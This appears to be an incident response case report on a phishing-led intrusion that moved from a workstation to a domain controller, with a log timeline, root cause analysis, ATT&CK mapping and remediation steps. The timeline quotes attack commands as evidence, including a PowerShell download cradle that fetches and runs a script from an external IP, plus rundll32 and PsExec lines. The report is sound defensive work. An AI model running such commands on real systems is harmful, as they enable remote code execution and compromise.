# Incident Investigation Case Report: Cobalt Strike Ingress & Domain Controller Pivot
**Case Reference:** INC-2026-0841  
**Severity:** P1 — CRITICAL  
**Lead Investigator:** Detection Engineering & Incident Response Practice  
**Date Opened:** 2026-10-08 09:15 UTC  
**Date Closed:** 2026-10-08 17:30 UTC  
**Closure Classification:** **TRUE POSITIVE (Malicious Intrusion)**  
**Associated Threat Hunt:** [`CDL-HUNT-01`](file:///c:/Users/Hp/Desktop/cyber/threat_hunts/hunt_01_c2_covert_beaconing.md)  
**Applicable Playbooks:** [`playbook_01_compromised_credentials.md`](file:///c:/Users/Hp/Desktop/cyber/playbooks/playbook_01_compromised_credentials.md), [`playbook_02_lateral_movement_remote_services.md`](file:///c:/Users/Hp/Desktop/cyber/playbooks/playbook_02_lateral_movement_remote_services.md), [`playbook_03_c2_beaconing_investigation.md`](file:///c:/Users/Hp/Desktop/cyber/playbooks/playbook_03_c2_beaconing_investigation.md)

---

## 1. Executive Summary
On 2026-10-08 at 09:15 UTC, during the execution of proactive threat hunt CDL-HUNT-01, an analyst identified covert outbound C2 beaconing originating from workstation `WKSTN-FIN-01` (`192.168.10.115`) directed to external IP `185.106.94.234:8443`. Concurrently, detection rules `CDL-RULE-001` (PowerShell Download Cradle) and `CDL-RULE-002` (LSASS Memory Access) triggered on the same endpoint. 

A comprehensive retrospective investigation revealed a multi-stage intrusion commencing from a weaponized spearphishing attachment, followed by in-memory beacon staging, local credential harvesting via LSASS memory dumping, and subsequent lateral movement to the Primary Domain Controller (`DC-01`) via PsExec. Rapid containment isolated the affected hosts, severed the C2 channel, revoked all compromised domain credentials, and prevented data exfiltration.

---

## 2. Reconstructed Incident Timeline (Raw Log Evidence)

All timestamps are documented in UTC. Evidence collected across Windows Security, Sysmon, and Zeek sensors:

| Timestamp (UTC) | Source Sensor | Event ID | Entity / Host | Account | Raw Log Evidence & Technical Detail |
|:---|:---|:---:|:---|:---|:---|
| `2026-10-08 08:14:10` | Win Security | `4624` | `WKSTN-FIN-01` | `CYBERION\jdoe` | LogonType 2 (Interactive Console Logon). User John Doe logs into desktop workstation. |
| `2026-10-08 08:22:04` | Sysmon | `1` | `WKSTN-FIN-01` | `CYBERION\jdoe` | **T1204.002 Execution:** `OUTLOOK.EXE` spawns child process `WINWORD.EXE` opening attachment `Invoice_Q3_Statement.docm`. |
| `2026-10-08 08:22:15` | Sysmon | `1` | `WKSTN-FIN-01` | `CYBERION\jdoe` | **T1059.001 Execution:** `WINWORD.EXE` executes `powershell.exe -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://185.106.94.234:8080/stage.ps1')"` (*Triggered CDL-RULE-001*). |
| `2026-10-08 08:22:19` | Zeek `http` | N/A | `192.168.10.115` | N/A | HTTP GET request to `http://185.106.94.234:8080/stage.ps1` returns 200 OK (Content-Length: 42,910 bytes). |
| `2026-10-08 08:22:31` | Sysmon | `1` | `WKSTN-FIN-01` | `CYBERION\jdoe` | **T1218.011 Defense Evasion:** PowerShell drops and executes `rundll32.exe C:\Users\jdoe\AppData\Local\Temp\sqlncli.dll,#1` (*Triggered CDL-RULE-008*). |
| `2026-10-08 08:23:00` | Zeek `conn` | N/A | `192.168.10.115` | N/A | **T1071.001 C2 Established:** TLS session initiated to `185.106.94.234:8443` initiating periodic beaconing with ~45s interval (*Surfaced in CDL-HUNT-01*). |
| `2026-10-08 08:41:12` | Sysmon | `10` | `WKSTN-FIN-01` | `CYBERION\jdoe` | **T1003.001 Credential Access:** `rundll32.exe` (PID 4892) opens process handle to `C:\Windows\System32\lsass.exe` with GrantedAccess `0x1010` (CallTrace: `ntdll.dll+0x9fb84`) (*Triggered CDL-RULE-002*). Mimikatz in-memory execution extracts credentials of logged-on Domain Administrator `CYBERION\da_admin`. |
| `2026-10-08 08:52:40` | Win Security | `4624` | `DC-01` | `CYBERION\da_admin` | **T1078.002 Privilege Use:** LogonType 3 (Network Logon) from source IP `192.168.10.115`. Special privileges assigned (Event 4672: `SeDebugPrivilege`, `SeTcbPrivilege`). |
| `2026-10-08 08:53:15` | Sysmon | `1` | `DC-01` | `CYBERION\da_admin` | **T1021.002 / T1569.002 Lateral Movement:** `services.exe` spawns `PSEXESVC.exe` which executes `cmd.exe /c whoami & net user /domain` (*Triggered CDL-RULE-003*). |
| `2026-10-08 09:18:00` | Security Ops | N/A | Subnet | SecOps | **Containment Initiated:** Host `WKSTN-FIN-01` isolated via EDR network containment. Perimeter firewall blocks IP `185.106.94.234`. `da_admin` and `jdoe` accounts disabled. |

---

## 3. Root Cause Analysis (5-Whys Methodology)

```
1. Why did the attacker gain access to Domain Controller DC-01?
   └── The attacker executed PsExec using credentials of Domain Admin 'da_admin'.

2. Why did the attacker possess 'da_admin' credentials?
   └── The attacker dumped LSASS process memory on workstation WKSTN-FIN-01 where da_admin had an active session.

3. Why did a Domain Administrator have an active session on an end-user workstation?
   └── A Tier-0 Domain Administrator logged into a Tier-2 workstation to troubleshoot a printer spooler issue, violating administrative tiering hygiene (Active Directory Administrative Tiering Model).

4. Why was malicious code running on WKSTN-FIN-01?
   └── John Doe opened a weaponized macro document delivered via email that spawned a PowerShell download cradle executing an unbacked DLL via rundll32.exe.

5. Why did the weaponized macro document reach the user's inbox and execute?
   └── ROOT CAUSE: Lack of email gateway macro attachment quarantine rules and Microsoft Office VBA macros enabled by default for external untrusted documents without Application Guard enforcement.
```

---

## 4. MITRE ATT&CK Mapping

```
Adversary Kill-Chain:
[Initial Access: T1566.001] Spearphishing Attachment
         │
         ▼
[Execution: T1059.001] PowerShell Download Cradle
         │
         ▼
[Defense Evasion: T1218.011] Rundll32 Proxy Execution
         │
         ▼
[Command & Control: T1071.001] HTTPS Beaconing (185.106.94.234:8443)
         │
         ▼
[Credential Access: T1003.001] LSASS Memory Dump (Mimikatz)
         │
         ▼
[Lateral Movement: T1021.002 / T1569.002] PsExec Service Execution on DC-01
```

---

## 5. Impact Assessment

- **Confidentiality:** HIGH. Active directory domain credentials exposed; memory artifacts harvested.
- **Integrity:** MEDIUM. PsExec service created on `DC-01`; no domain persistence (Golden Ticket or secondary admin accounts) was successfully registered prior to containment.
- **Availability:** LOW. No systems disrupted; ransomware payload was not delivered.
- **Scope of Compromise:**
  - `WKSTN-FIN-01` (`192.168.10.115`): Fully compromised endpoint.
  - `DC-01` (`192.168.20.10`): Administrative network logon and service creation; contained before registry or NTDS manipulation.

---

## 6. Containment, Eradication & Recovery Actions Taken

1. **Host Isolation:** Workstation `WKSTN-FIN-01` network-isolated at 09:18 UTC via EDR agent.
2. **Perimeter Blackhole:** Null-routed IP `185.106.94.234` on edge firewalls and web proxies.
3. **Identity Remediation:**
   - Terminated all active Kerberos ticket granting tickets (TGT) for `da_admin` and `jdoe`.
   - Executed two consecutive resets of the Active Directory `krbtgt` account password with a 12-hour interval.
   - Forced password resets for all domain administrative accounts.
4. **Endpoint Forensics & Eradication:**
   - Terminated PID 4892 (`rundll32.exe`) and PID 812 (`PSEXESVC.exe`).
   - Deleted staged payload `C:\Users\jdoe\AppData\Local\Temp\sqlncli.dll` and removed PSEXESVC service entry.
   - Workstation `WKSTN-FIN-01` wiped and reimaged from known-good golden baseline.

---

## 7. Closure Classification & Lessons Learned

- **Closure Classification:** **TRUE POSITIVE (P1 - Critical)**
  - *Justification:* Corroborated multi-sensor evidence (Sysmon, Windows Security, Zeek) confirming weaponized code execution, memory dumping, lateral movement, and external C2 communication.
- **Key Lessons & Architectural Improvements:**
  - **Enforce AD Tiering:** Strictly block Tier-0 credentials from authenticating to Tier-2 workstations via Group Policy ("Deny logon through Remote Desktop Services" & "Deny access to this computer from the network").
  - **Attack Surface Reduction (ASR):** Enable Microsoft Defender ASR rule *"Block Office applications from creating child processes"*.
  - **Credential Guard:** Enable Windows Defender Credential Guard via Virtualization-Based Security (VBS) to prevent non-kernel reading of LSASS memory.

---
*Approved for Closure by:*  
**Director, Security Operations — Cyberion Defense Labs**
